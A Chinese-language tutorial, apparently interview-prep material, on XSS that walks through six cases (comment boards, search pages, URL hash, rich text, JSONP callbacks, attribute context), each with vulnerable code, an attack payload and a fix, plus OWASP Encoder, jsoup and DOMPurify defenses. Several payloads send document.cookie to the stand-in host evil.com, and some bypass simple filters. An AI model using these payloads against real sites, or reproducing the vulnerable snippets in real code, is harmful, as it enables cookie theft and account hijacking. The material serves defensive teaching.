# XSS 跨站脚本攻击事例有哪些？

## 核心概念

XSS 攻击按注入位置和触发方式分三类，每类有典型真实场景。理解这些事例不是为了“学会攻击”，而是为了在业务里识别相同模式的漏洞点。所有 XSS 事例的本质都是“不可信数据未编码就插入到 DOM 上下文中”，差别只在数据来源：来自数据库是存储型、来自 URL 参数是反射型、来自前端 JS 读 URL 是 DOM 型。

下面的事例覆盖了实际项目中最常踩坑的场景：评论/留言板（存储型）、搜索结果页（反射型）、前端路由参数（DOM 型）、富文本编辑器（存储型变体）、第三方组件回调（DOM 型变体）。每个事例都给出漏洞代码、攻击 Payload 和修复方式。

## 标准回答

一句话结论：**XSS 事例按类型分三大类——存储型（评论/留言板注入脚本存库）、反射型（搜索/错误页回显 URL 参数）、DOM 型（前端 JS 把 URL 参数写入 innerHTML）；真实项目中最常见的是评论区未转义、搜索页回显、富文本不过滤、前端 hash 路由注入**。

典型事例速览：

| 事例 | 类型 | 漏洞点 | 危害 |
|------|------|--------|------|
| 评论区注入 `<script>` | 存储型 | 内容未编码回显 | 窃取所有访问者 Cookie |
| 搜索页回显关键词 | 反射型 | URL 参数拼到 HTML | 钓鱼链接窃取 Cookie |
| URL hash 写入 innerHTML | DOM 型 | 前端 JS 未转义 | 钓鱼链接执行脚本 |
| 富文本编辑器存库 | 存储型 | HTML 未白名单过滤 | 任意脚本注入 |
| 第三方组件 JSONP 回调 | DOM 型 | 回调函数名未校验 | 劫持页面执行任意代码 |
| 用户昵称插入属性 | 反射型 | 属性上下文未编码 | 闭合属性注入事件 |

## 实现原理

### 事例一：评论区存储型 XSS

漏洞代码（PHP）：

```php
<?php
// 直接输出评论内容，未编码
while ($row = $comments->fetch_assoc()) {
    echo "<div class='comment'>" . $row['content'] . "</div>";
}
?>
```

攻击 Payload：

```html
<script>
  var img = new Image();
  img.src = "https://evil.com/steal?cookie=" + encodeURIComponent(document.cookie);
</script>
```

攻击者提交评论后，每个访问该文章的用户浏览器都会执行这段脚本，Cookie 被发到 evil.com。这是危害最大的 XSS——一次注入，长期生效。

修复：

```php
echo "<div class='comment'>" . htmlspecialchars($row['content'], ENT_QUOTES, 'UTF-8') . "</div>";
```

### 事例二：搜索页反射型 XSS

漏洞代码：

```php
<p>您搜索的是: <?php echo $_GET['keyword']; ?></p>
```

攻击者构造钓鱼链接：

```
https://bank.com/search?keyword=<script>fetch('//evil.com?c='+document.cookie)</script>
```

诱导用户点击后，搜索词被原样回显到 HTML，脚本执行。反射型 XSS 不持久，但可配合钓鱼邮件大量传播。

修复：同样用 `htmlspecialchars`，或在前端用 `textContent` 渲染。

### 事例三：URL hash 写入 innerHTML 的 DOM 型 XSS

漏洞代码：

```javascript
// 欢迎语根据 URL hash 显示
const name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = '欢迎, ' + name;
```

攻击者构造链接：

```
https://site.com/#<img src=x onerror=alert(document.cookie)>
```

用户点击后，`innerHTML` 解析 HTML，`onerror` 触发执行。整个过程服务端无参与，WAF 抓不到，是最隐蔽的 XSS。

修复：

```javascript
// 用 textContent 不解析 HTML
document.getElementById('welcome').textContent = '欢迎, ' + decodeURIComponent(name);

// 或必须用 innerHTML 时先 sanitize
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize('欢迎, ' + name);
```

### 事例四：富文本编辑器存储型 XSS

漏洞代码（Java）：

```java
// 用户用富文本编辑器写的文章，原样存原样取
String html = request.getParameter("content");
articleDao.save(html);
// 渲染时直接输出
out.write(article.getContent());
```

攻击 Payload（绕过简单过滤）：

```html
<a href="javascript:alert(document.cookie)">点击查看</a>
<img src=x onerror="fetch('//evil.com?c='+document.cookie)">
<svg onload="alert(1)">
<iframe src="javascript:alert(1)"></iframe>
```

修复：用 jsoup 白名单清洗，只允许安全标签和属性：

```java
import org.jsoup.Jsoup;
import org.jsoup.safety.Safelist;

String safe = Jsoup.clean(html, Safelist.relaxed()
    .addTags("p", "br", "strong", "em", "a", "img", "ul", "ol", "li")
    .addAttributes("a", "href", "title")
    .addAttributes("img", "src", "alt")
    .addProtocols("a", "href", "http", "https")
    .addProtocols("img", "src", "http", "https"));
// 禁掉 javascript: 协议
```

### 事例五：第三方 JSONP 回调 DOM 型 XSS

漏洞代码：

```javascript
// 动态加载 JSONP
const cb = new URLSearchParams(location.search).get('callback');
const script = document.createElement('script');
script.src = `https://api.example.com/data?callback=${cb}`;
document.body.appendChild(script);
```

攻击者构造：

```
https://site.com/?callback=alert(document.cookie);function x
```

`callback` 参数被拼到 `<script src>`，服务端返回 `alert(document.cookie);function x({...})`，浏览器执行 `alert`。

修复：白名单校验回调函数名（只允许 `[A-Za-z0-9_.]+`），不要原样拼接。

### 事例六：属性上下文未编码

漏洞代码：

```php
<input type="text" value="<?php echo $_GET['name']; ?>">
```

攻击 Payload：

```
?name=" onfocus="alert(document.cookie)" autofocus="
```

渲染结果：

```html
<input type="text" value="" onfocus="alert(document.cookie)" autofocus="">
```

属性被闭合，注入 `onfocus` 事件。修复：HTML 属性上下文必须用 `htmlspecialchars(..., ENT_QUOTES)` 转义双引号和单引号。

## 代码示例

### Java 服务端统一编码工具

```java
import org.owasp.encoder.Encode;
import org.jsoup.Jsoup;
import org.jsoup.safety.Safelist;

public class XssDefense {

    /** 普通文本输出到 HTML body */
    public static String forHtml(String input) {
        return Encode.forHtml(input);
    }

    /** 输出到 HTML 属性 */
    public static String forAttr(String input) {
        return Encode.forHtmlAttribute(input);
    }

    /** 输出到 JavaScript 字符串 */
    public static String forJs(String input) {
        return Encode.forJavaScript(input);
    }

    /** 输出到 URL 参数 */
    public static String forUrl(String input) {
        return Encode.forUriComponent(input);
    }

    /** 富文本白名单清洗 */
    public static String forRichText(String html) {
        return Jsoup.clean(html, Safelist.relaxed()
            .addProtocols("a", "href", "http", "https"));
    }
}
```

### 前端 React/Vue 防护

```jsx
// React 默认转义，安全
function Comment({ text }) {
  return <div>{text}</div>;
}

// 危险：绕过转义
function RichText({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;  // 必须先 sanitize
}

// 安全：先清洗
import DOMPurify from 'dompurify';
function SafeRichText({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />;
}
```

```html
<!-- Vue 默认转义 -->
<template>
  <div>{{ comment }}</div>
</template>

<!-- v-html 等同 dangerouslySetInnerHTML，必须先 sanitize -->
<template>
  <div v-html="sanitized"></div>
</template>
<script>
import DOMPurify from 'dompurify';
export default {
  computed: {
    sanitized() { return DOMPurify.sanitize(this.rawHtml); }
  }
}
</script>
```

## 实战场景

| 场景 | 类型 | 修复 |
|------|------|------|
| 评论区/留言板 | 存储型 | 服务端 HTML 编码，富文本用 jsoup 白名单 |
| 搜索结果页 | 反射型 | 输出编码 + 关键词白名单字符 |
| 用户昵称/简介 | 存储型 | 按展示上下文编码 |
| 错误页回显参数 | 反射型 | 错误信息统一编码模板 |
| 前端 hash 路由 | DOM 型 | 改用 textContent 或 sanitize |
| 富文本编辑器 | 存储型 | jsoup 白名单 + 前端 DOMPurify |
| JSONP 回调 | DOM 型 | 校验回调函数名白名单 |
| 文件名展示 | 存储/反射 | 文件名做编码，禁止直接拼路径 |
| 邮件模板渲染 | 存储 | 模板引擎开自动转义 |

## 深挖追问

**Q1：富文本场景为什么不能简单 HTML 编码？**

因为业务需要保留 `<b>` `<a>` 等标签的语义。直接编码会让 `<b>加粗</b>` 显示成纯文本 `<b>加粗</b>`。正确做法是白名单清洗：保留安全标签、删危险标签和属性、对 `href`/`src` 协议做白名单（只允许 http/https，禁 `javascript:`）。

**Q2：存储型 XSS 在数据库里存原始还是编码后？**

存原始，输出时编码。理由：不同上下文（HTML、JS、URL）编码方式不同，存编码后会丢失原始数据且在非 HTML 上下文展示时双重编码。数据库只管存，渲染时按目标上下文编码。

**Q3：DOM 型 XSS 服务端 WAF 能挡住吗？**

不能。DOM 型 XSS 全程在浏览器发生，请求 URL 里可能有恶意参数但服务端返回的 HTML 是正常的，WAF 看不到攻击特征。只能靠前端代码用 `textContent` 而非 `innerHTML`、用 DOMPurify 清洗。

**Q4：CSP nonce 模式怎么用？**

服务端为每个响应生成随机 nonce，CSP 头声明 `script-src 'self' 'nonce-随机串'`，页面内联 `<script nonce="随机串">` 才能执行。注入的脚本没有 nonce 跑不起来。但 nonce 要每次请求换新，且要避免被 XSS 偷走（被偷就失效）。

**Q5：怎么发现项目里有没有 XSS？**

自动化：用 OWASP ZAP、Burp Suite 主动扫描；代码审计：全局搜索 `innerHTML`、`v-html`、`dangerouslySetInnerHTML`、`eval`、`document.write`，以及服务端字符串拼接 HTML 的地方；上线前：开 CSP Report-Only 收集违规上报。

## 易错点

- **存储型存编码后的内容**：上下文切换时双重编码或漏编码，应该存原始。
- **只编码 HTML body 上下文**：属性、JS、URL 上下文编码方式不同，要分别处理。
- **富文本用黑名单过滤**：永远绕不完，必须白名单。
- **DOM 型以为服务端有防护就行**：服务端无参与，必须改前端代码。
- **JSONP 回调不校验**：被注入任意 JS 函数名。
- **CSP 上线直接强制**：先 Report-Only 收集误伤，再切强制。
- **以为转义单引号就行**：双引号也要转，按 `ENT_QUOTES` 模式。
- **用 `StringEscapeUtils.escapeHtml4` 转义富文本**：会把 `<b>` 也转义，破坏语义，应该用 jsoup。

## 总结

XSS 事例虽多，模式只有三类：存储型（数据来自数据库）、反射型（数据来自 URL 参数服务端回显）、DOM 型（数据来自前端 JS 读取）。修复思路按上下文编码：HTML body、HTML 属性、JavaScript、URL 各有编码方式，富文本用白名单清洗。评论区、搜索页、富文本编辑器、前端路由是真实项目中最常踩坑的四个点。DOM 型 XSS 服务端 WAF 抓不到，必须靠前端代码用 `textContent` 而非 `innerHTML`。

## 参考资料

- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [PortSwigger: Stored vs Reflected vs DOM XSS](https://portswigger.net/web-security/cross-site-scripting)
- [jsoup Safelist](https://jsoup.org/cookbook/cleaning-html/safelist-sanitizer)
- [DOMPurify](https://github.com/cure53/DOMPurify)

---
